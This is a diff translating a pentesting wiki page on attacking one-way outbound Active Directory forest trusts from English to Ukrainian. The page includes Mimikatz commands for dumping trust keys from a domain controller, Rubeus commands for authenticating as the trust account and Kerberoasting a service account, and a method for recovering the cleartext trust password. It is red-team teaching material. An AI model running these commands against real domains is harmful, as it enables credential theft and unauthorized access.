@@ -1,13 +1,12 @@
-# External Forest Domain - One-Way (Outbound)
+# Зовнішній лісовий домен - односторонній (вихідний)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.
+У цьому сценарії **ваш домен** **довіряє** деяким **привілеям** принципу з **інших доменів**.
 
-## Enumeration
+## Перерахування
 
-### Outbound Trust
-
+### Вихідна довіра
 ```powershell
 # Notice Outbound trust
 Get-DomainTrust
@@ -29,56 +28,46 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
-
 ## Trust Account Attack
 
-A security vulnerability exists when a trust relationship is established between two domains, identified here as domain **A** and domain **B**, where domain **B** extends its trust to domain **A**. In this setup, a special account is created in domain **A** for domain **B**, which plays a crucial role in the authentication process between the two domains. This account, associated with domain **B**, is utilized for encrypting tickets for accessing services across the domains.
+Існує вразливість безпеки, коли встановлюється довірчі відносини між двома доменами, які тут позначені як домен **A** та домен **B**, де домен **B** розширює свою довіру до домену **A**. У цій конфігурації спеціальний обліковий запис створюється в домені **A** для домену **B**, який відіграє важливу роль у процесі аутентифікації між двома доменами. Цей обліковий запис, пов'язаний з доменом **B**, використовується для шифрування квитків для доступу до сервісів між доменами.
 
-The critical aspect to understand here is that the password and hash of this special account can be extracted from a Domain Controller in domain **A** using a command line tool. The command to perform this action is:
-
+Критичний аспект, який потрібно зрозуміти тут, полягає в тому, що пароль і хеш цього спеціального облікового запису можуть бути витягнуті з контролера домену в домені **A** за допомогою інструменту командного рядка. Команда для виконання цієї дії:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
+Ця екстракція можлива, оскільки обліковий запис, позначений знаком **$** після його імені, активний і належить до групи "Domain Users" домену **A**, тим самим успадковуючи дозволи, пов'язані з цією групою. Це дозволяє особам аутентифікуватися в домені **A** за допомогою облікових даних цього облікового запису.
 
-This extraction is possible because the account, identified with a **$** after its name, is active and belongs to the "Domain Users" group of domain **A**, thereby inheriting permissions associated with this group. This allows individuals to authenticate against domain **A** using the credentials of this account.
+**Увага:** Можливо використати цю ситуацію для отримання доступу до домену **A** як користувач, хоча з обмеженими дозволами. Проте, цей доступ є достатнім для проведення перерахунку в домені **A**.
 
-**Warning:** It is feasible to leverage this situation to gain a foothold in domain **A** as a user, albeit with limited permissions. However, this access is sufficient to perform enumeration on domain **A**.
-
-In a scenario where `ext.local` is the trusting domain and `root.local` is the trusted domain, a user account named `EXT$` would be created within `root.local`. Through specific tools, it is possible to dump the Kerberos trust keys, revealing the credentials of `EXT$` in `root.local`. The command to achieve this is:
-
+У сценарії, де `ext.local` є довірчим доменом, а `root.local` є довіреним доменом, обліковий запис користувача з ім'ям `EXT$` буде створено в `root.local`. За допомогою специфічних інструментів можливо скинути ключі довіри Kerberos, розкриваючи облікові дані `EXT$` в `root.local`. Команда для досягнення цього виглядає так:
 ```bash
 lsadump::trust /patch
 ```
-
-Following this, one could use the extracted RC4 key to authenticate as `root.local\EXT$` within `root.local` using another tool command:
-
+Наступним кроком можна використати витягнутий ключ RC4 для автентифікації як `root.local\EXT$` в `root.local`, використовуючи команду іншого інструмента:
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-
-This authentication step opens up the possibility to enumerate and even exploit services within `root.local`, such as performing a Kerberoast attack to extract service account credentials using:
-
+Цей крок аутентифікації відкриває можливість перераховувати та навіть експлуатувати сервіси в `root.local`, такі як виконання атаки Kerberoast для витягування облікових даних облікового запису служби за допомогою:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
+### Збір пароля довіри в чистому вигляді
 
-### Gathering cleartext trust password
+У попередньому потоці використовувався хеш довіри замість **пароля в чистому вигляді** (який також був **вивантажений за допомогою mimikatz**).
 
-In the previous flow it was used the trust hash instead of the **clear text password** (that was also **dumped by mimikatz**).
-
-The cleartext password can be obtained by converting the \[ CLEAR ] output from mimikatz from hexadecimal and removing null bytes ‘\x00’:
+Пароль в чистому вигляді можна отримати, перетворивши вихід \[ CLEAR ] з mimikatz з шістнадцяткового формату та видаливши нульові байти ‘\x00’:
 
 ![](<../../images/image (938).png>)
 
-Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key cycles (30 days), the cleartext will not be human-readable but technically still usable.
+Іноді при створенні відносин довіри користувачеві потрібно ввести пароль для довіри. У цій демонстрації ключем є оригінальний пароль довіри, тому він читається людиною. Оскільки ключ змінюється (кожні 30 днів), пароль в чистому вигляді не буде читабельним для людини, але технічно все ще буде використовуваним.
 
-The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key of the trust account. Here, querying root.local from ext.local for members of Domain Admins:
+Пароль в чистому вигляді можна використовувати для виконання звичайної аутентифікації як обліковий запис довіри, альтернативи запиту TGT за допомогою секретного ключа Kerberos облікового запису довіри. Тут запитуються root.local з ext.local для членів Domain Admins:
 
 ![](<../../images/image (792).png>)
 
-## References
+## Посилання
 
 - [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
 
 {{#include ../../banners/hacktricks-training.md}}
-
